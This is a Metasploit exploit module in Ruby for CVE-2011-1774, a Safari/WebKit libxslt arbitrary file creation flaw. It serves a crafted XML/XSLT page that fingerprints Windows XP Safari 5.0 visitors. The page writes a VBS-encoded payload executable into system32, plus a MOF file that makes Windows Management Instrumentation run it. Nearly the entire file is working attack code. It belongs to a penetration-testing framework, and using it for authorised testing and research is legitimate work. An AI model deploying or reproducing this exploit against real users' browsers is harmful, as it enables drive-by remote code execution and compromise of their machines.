##
# $Id: safari_xslt_output.rb 13987 2011-10-18 07:39:50Z sinn3r $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpServer::HTML
	include Msf::Exploit::EXE
	include Msf::Exploit::WbemExec

	def initialize(info = {})
		super(update_info(info,
			'Name'            => 'Apple Safari Webkit libxslt Arbitrary File Creation',
			'Description'     => %q{
					This module exploits a file creation vulnerability in the Webkit
				rendering engine. It is possible to redirect the output of a XSLT
				transformation to an arbitrary file. The content of the created file must be
				ASCII or UTF-8. The destination path can be relative or absolute. This module
				has been tested on Safari and Maxthon. Code execution can be acheived by first
				uploading the payload to the remote machine in VBS format, and then upload a MOF
				file, which enables Windows Management Instrumentation service to execute the VBS.
			},
			'License'         => MSF_LICENSE,
			'Author'          => ['Nicolas Gregoire'],
			'Version'         => '$Revision: 13987 $',
			'References'      =>
				[
					['CVE', '2011-1774'],
					['OSVDB', '74017'],
					['URL', 'http://lists.apple.com/archives/Security-announce/2011/Jul/msg00002.html'],
				],
			'DefaultOptions'  =>
				{
					'InitialAutoRunScript' => 'migrate -f',
				},
			'Payload'         =>
				{
					'Space' => 2048,
				},
			'Platform'        => 'win',
			'Targets'         =>
				[
					#Windows before Vista
					[ 'Automatic', { } ],
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Jul 20 2011'))
	end

	def autofilter
		false
	end

	def check_dependencies
		use_zlib
	end

	def on_request_uri(cli, request)
		# Check target before attacking
		agent = request.headers['User-Agent']
		if agent !~ /Windows NT 5\.1/ or agent !~ /Safari/ or agent !~ /Version\/5\.0\.\d/
			print_error("This target isn't supported: #{agent.to_s}")
			send_not_found(cli)
			return
		end

		url =  "http://"
		url += (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST']
		url += ":" + datastore['SRVPORT'] + get_resource() + "/"

		content = <<-EOS
<?xml-stylesheet type="text/xml" href="#fragment"?>
<!-- Define the DTD of the document
	 This is needed, in order to later reference the XSLT stylesheet by a #fragment
	 This trick allows to have both the XML and the XSL in the same file
	 Cf. http://scarybeastsecurity.blogspot.com/2011/01/harmless-svg-xslt-curiousity.html -->
<!DOCTYPE doc [
 <!ATTLIST xsl:stylesheet
 id ID #REQUIRED
>]>
<doc>

<!-- Define location and content of the files -->
<mof>
	<location><![CDATA[\\\\.\\GLOBALROOT\\SystemRoot\\system32\\wbem\\mof\\#{@mof_name}]]></location>
	<content><![CDATA[#{@mof_content}]]></content>
</mof><vbs>
	<location><![CDATA[\\\\.\\GLOBALROOT\\SystemRoot\\system32\\#{@vbs_name}]]></location>
	<content><![CDATA[#{@vbs_content}]]></content>
</vbs>

<!-- The XSLT stylesheet header, including the "sx" extension -->
<xsl:stylesheet id="fragment" version="1.0" 
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:sx="http://icl.com/saxon"
  extension-element-prefixes="sx"
  xmlns="http://www.w3.org/1999/xhtml" >
<xsl:output method="xml" indent="yes" />

<!-- The XSLT template -->
<xsl:template match="/">
	<!-- Define some XSLT variables -->
	<xsl:variable name="moflocation" select="//mof/location/text()"/>
	<xsl:variable name="vbslocation" select="//vbs/location/text()"/>
	<!-- Create the files -->
	<sx:output file="{$vbslocation}" method="text">
		<xsl:value-of select="//vbs/content"/>
	</sx:output>
	<sx:output file="{$moflocation}" method="text">
		<xsl:value-of select="//mof/content"/>
	</sx:output>
	<!-- Some output to the browser -->
	<html> </html>
</xsl:template>
</xsl:stylesheet>
</doc>
		EOS

		#Clear the extra tabs
		content = content.gsub(/^\t\t/, '')

		print_status("Sending #{self.name} to #{cli.peerhost}:#{cli.peerport}...")
		send_response(cli, content, {'Content-Type'=>'application/xml'})
		handler(cli)

	end

	def exploit
		# In order to save binary data to the file system the payload is written to a VBS
		# file and execute it from there via a MOF
		@mof_name = rand_text_alpha(rand(5)+5) + ".mof"
		@vbs_name = rand_text_alpha(rand(5)+5) + ".vbs"

		print_status("Encoding payload into vbs...")
		payload = generate_payload_exe
		@vbs_content = Msf::Util::EXE.to_exe_vbs(payload)

		print_status("Generating mof file...")
		@mof_content = generate_mof(@mof_name, @vbs_name)
		super
	end

end
